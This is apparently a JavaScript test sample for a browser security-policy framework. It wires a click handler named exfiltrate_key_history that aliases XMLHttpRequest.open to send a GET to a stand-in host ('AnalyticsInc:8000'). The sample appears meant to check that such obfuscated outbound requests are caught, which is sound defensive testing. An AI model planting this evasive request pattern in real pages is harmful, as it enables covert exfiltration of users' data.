
JAM.startProfile('load');
function exfiltrate_key_history(){function partial(func){function v0(){var v5=Array.prototype.slice,v5=JAM.call(args.concat,args,[JAM.call(v5.call,v5,[arguments],JAM.policy.p13)],JAM.policy.p24);return JAM.call(func.apply,func,[this,v5],JAM.policy.p23)}var v2=Array.prototype.slice,args=JAM.call(v2.call,v2,[arguments,1],JAM.policy.p13);return v0}var v3=xmlhttp=new XMLHttpRequest,v9=partial(xmlhttp.open,"GET","http://AnalyticsInc:8000/submission.html?test=partial",!0);v3.openn=v9;JAM.call(xmlhttp.openn,
xmlhttp,[],JAM.policy.p13);JAM.call(xmlhttp.send,xmlhttp,[null],JAM.policy.p13)}JAM.set(JAM.call(document.getElementById,document,["test"],JAM.policy.p14),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
